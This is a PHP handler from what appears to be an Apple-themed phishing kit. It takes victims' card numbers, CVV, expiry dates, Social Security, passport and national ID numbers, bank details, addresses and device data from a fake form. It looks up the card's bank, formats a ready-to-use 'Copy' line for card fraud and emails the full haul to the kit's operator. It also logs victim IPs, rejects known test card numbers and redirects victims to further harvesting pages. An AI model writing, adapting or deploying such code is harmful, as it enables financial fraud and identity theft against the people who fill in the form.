<?php
error_reporting(0);
session_start();
set_time_limit(0);
include '../main.php';

$_SESSION['cart'] = $_POST['number'];
$_SESSION['expired'] = $_POST['expred'];
$_SESSION['cvv'] = $_POST['sdfs'];
$_SESSION['ccname'] = $_POST['cardname'];
$_SESSION['ccnumber'] = $_POST['number'];
$_SESSION['ccexpired'] = $_POST['expred'];
$_SESSION['cccvv'] = $_POST['sdfs'];
$_SESSION['date'] = $_POST['bith'];
$_SESSION['country'] = $_POST['cojjuntry'];
$_SESSION['firstname'] = $_POST['name1'];
$_SESSION['lastname'] = $_POST['name2'];
$_SESSION['cc_limit'] = $_POST['cc_limit'];
$_SESSION['cid'] = $_POST['cid'];

$_SESSION['idnumber'] = $_POST['idnumber'];
$_SESSION['qatarid'] = $_POST['qatarid'];
$_SESSION['civilid'] = $_POST['civilid'];
$_SESSION['nationalid'] = $_POST['nationalid'];
$_SESSION['citizenid'] = $_POST['citizenid'];
$_SESSION['passportnumber'] = $_POST['passportnumber'];
$_SESSION['cassn'] = $_POST['cassn'];
$_SESSION['ssn'] = $_POST['ssn'];
$_SESSION['acc_number'] = $_POST['acc_number'];
$_SESSION['osidnum'] = $_POST['osidnum'];
$_SESSION['bankaccnumber'] = $_POST['bankaccnumber'];

$_SESSION['phone'] = $_POST['phone'];
$_SESSION['cc_name'] = $_POST['cardname'];
$_SESSION['address1'] = $_POST['adre1'];
$_SESSION['city'] = $_POST['city'];
$_SESSION['state'] = $_POST['state'];
$_SESSION['country'] = $_POST['cojjuntry'];
$_SESSION['zip'] = $_POST['zip'];
$_SESSION['dob'] = $_POST['bith'];
$_SESSION['sortcode'] = $_POST['sortcode'];
$agent = $_SERVER['HTTP_USER_AGENT'];

if($_POST['number'] == "") {
    exit();
}

$bin = $_POST['number'];
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$bin_1 = substr($bin,0,1);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);

$expirednya = $_POST['expred'];
$tahun = substr($expirednya,5,6);
$bulan = substr($expirednya,0,2);
$expirednya = "$bulan|$tahun";
$cvv = $_POST['sdfs'];
$number = preg_replace('/\s/', '', $_POST['number']);
$message  = "++--------------------------------[ RESULT YS ]-----------------------------++\n";
$message .= "++--------------------------------[ LOGIN DETAILS ]-------------------------------++\n";
$message .= "Apple ID			: ".$_SESSION['email']."\n";
$message .= "Password			: ".$_SESSION['password']."\n";
$message .= "++--------------------------------[ CARD DETAILS ]-------------------------------++\n";
$message .= "Bank			: ".$xBIN["bank"]["name"]."\n";
$message .= "Type			: ".strtoupper($xBIN["scheme"])." - ".strtoupper($xBIN["type"])."\n";
$message .= "Level			: ".strtoupper($xBIN["brand"])."\n";
$message .= "Cardholders    : ".$_POST['cardname']."\n";
$message .= "CC Number		: ".$_POST['number']."\n";
$message .= "Expired		: ".$_POST['expred']."\n";
$message .= "CVV			: ".$_POST['sdfs']."\n";
$message .= "AMEX CID       : ".$_POST['cid']."\n";
$message .= "Sort Code		: ".$_POST['sortcode']."\n";
$message .= "Credit Limit	: ".$_POST['cc_limit']."\n";
$message .= "Copy			: $number|$expirednya|$cvv\n";
$message .= "++-------------------------[ PERSONAL INFORMATION ]--------------------------------++\n";
$message .= "First Name		: ".$_POST['name1']."\n";
$message .= "Last Name		: ".$_POST['name2']."\n";
$message .= "Address		: ".$_POST['adre1']."\n";
$message .= "City			: ".$_POST['city']."\n";
$message .= "State			: ".$_POST['state']."\n";
$message .= "Country		: ".$_POST['cojjuntry']."\n";
$message .= "Zip			: ".$_POST['zip']."\n";
$message .= "BirthDay		: ".$_POST['bith']."\n";
$message .= "Phone			: ".$_POST['phone']."\n";
$message .= "++------------------------[ SOCIAL INFORMATION ]------------------------------++\n";
$message .= "ID Number					: ".$_POST['idnumber']."\n";
$message .= "Civil ID					: ".$_POST['civilid']."\n";
$message .= "Qatar ID					: ".$_POST['qatarid']."\n";
$message .= "National ID				: ".$_POST['nationalid']."\n";
$message .= "Citizen ID					: ".$_POST['citizenid']."\n";
$message .= "Passport Number			: ".$_POST['passportnumber']."\n";
$message .= "Bank Access Number         : ".$_POST['bankaccnumber']."\n";
$message .= "Social Insurance Number	: ".$_POST['cassn']."\n";
$message .= "Social Security Number		: ".$_POST['ssn']."\n";
$message .= "session/ Number				: ".$_POST['acc_number']."\n";
$message .= "OSID Number				: ".$_POST['osidnum']."\n";
$message .= "++--------------------------[ PC INFORMATION ]--------------------------------++\n";
$message .= "IP Address		: ".$ip2."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br." / ".$cn."\n";
$message .= "Date			: ".$date."\n";
$message .= "User Agent		: ".$agent."\n";
$message .= "++--------------------------[ YS ]--------------------------++\n";

// Validasi CC Valid tapi asal2an
if($number == '4111111111111111' or $number == '5500000000000004' or $number == '340000000000009' or $number == '6011000000000004' or $number == '3088000000000009') {
    echo "<META HTTP-EQUIV='refresh' content='0; URL=../session/?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
    exit();
}

if($bin_1 == '1' or $bin_1 == '2' or $bin_1 == '7' or $bin_1 == '8' or $bin_1 == '9' or $bin_1 == '0') {
    echo "<META HTTP-EQUIV='refresh' content='0; URL=../session/?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
    exit();
}

if($bin_1 == '4') {
    if(strlen($number) == '16') {
    }else{
        echo "<META HTTP-EQUIV='refresh' content='0; URL=../session/?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
        exit();
    }
}

if($bin_1 == '5') {
    if(strlen($number) == '16') {
    }else{
        echo "<META HTTP-EQUIV='refresh' content='0; URL=../session/?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
        exit();
    }
}

if($bin_1 == '6') {
    if(strlen($number) == '16') {
    }else{
        echo "<META HTTP-EQUIV='refresh' content='0; URL=../session/?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
        exit();
    }
}

if($bin_1 == '3') {
    if(strlen($number) >= '12') {
    }else{
        echo "<META HTTP-EQUIV='refresh' content='0; URL=../session/?view=update&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."&error=2'>";
        exit();
    }
}

$bin = $_POST['number'];
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,6);
$_SESSION['bank_bin'] = $bin;
if($xBIN["brand"] == "") {
	$subject = $bin." - ".strtoupper($xBIN["scheme"])." ".strtoupper($xBIN["type"])." ".strtoupper($xBIN["bank"]["name"])." [ $cn - $os - $ip2 ]";
    $subbin = $bin." - ".strtoupper($xBIN["scheme"])." ".strtoupper($xBIN["type"])." ".strtoupper($xBIN["bank"]["name"]);
}else{
	$subject = $bin." - ".strtoupper($xBIN["scheme"])." ".strtoupper($xBIN["type"])." ".strtoupper($xBIN["brand"])." ".strtoupper($xBIN["bank"]["name"])." [ $cn - $os - $ip2 ]";
    $subbin = $bin." - ".strtoupper($xBIN["scheme"])." ".strtoupper($xBIN["type"])." ".strtoupper($xBIN["brand"])." ".strtoupper($xBIN["bank"]["name"]);
}
$from = $_SESSION['firstname']." ".$_SESSION['lastname'];
if($setting['mix_result'] == 'on') {
}else{
    if($from == $_SESSION['data_submit']) {
    }else{
        kirim_mail($to,$from,$subject,$message);
        $_SESSION['data_submit'] = $from;
        $click = fopen("../logs/total_cc.txt","a");
        fwrite($click,"$ip2"."\n");
        fclose($click);
        $click = fopen("../logs/total_bin.txt","a");
        fwrite($click,"$subbin"."\n");
        fclose($click);
        $click = fopen("../logs/log_visitor.txt","a");
        $jam = date("h:i:sa");
        fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Mengisi Credit Card (Mix Result)"."\n");
        fclose($click);
    }
}
if(preg_match('/AEON/',$_SESSION['bank_name'])) { //BIN AEON TIDAK ADA VBV JADI LANGSUNG SEND EMAIL
    if($from == $_SESSION['data_submit']) {
    }else{
        kirim_mail($to,$from,$subject,$message);
        $_SESSION['data_submit'] = $from;
        $click = fopen("../logs/total_cc.txt","a");
        fwrite($click,"$ip2"."\n");
        fclose($click);
        $click = fopen("../logs/total_bin.txt","a");
        fwrite($click,"$subbin"."\n");
        fclose($click);
        $click = fopen("../logs/log_visitor.txt","a");
        $jam = date("h:i:sa");
        fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Mengisi Credit Card"."\n");
        fclose($click);
    }
}

if($setting['get_vbv'] == 'on') {
		echo "<META HTTP-EQUIV='refresh' content='0; URL=../session/?view=vbv&appIdKey=".$_SESSION['key']."&id=".$_POST["xuser"]."&country=".$cid."'>";
		exit();
}else if($getphoto == 'on') {
		echo "<META HTTP-EQUIV='refresh' content='0; URL=../session/?view=upload&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
		exit();
}else{
		echo "<META HTTP-EQUIV='refresh' content='0; URL=../session/?view=done&appIdKey=".$_SESSION['key']."&id=".$_SESSION['xusername']."&country=".$cid."'>";
}
?>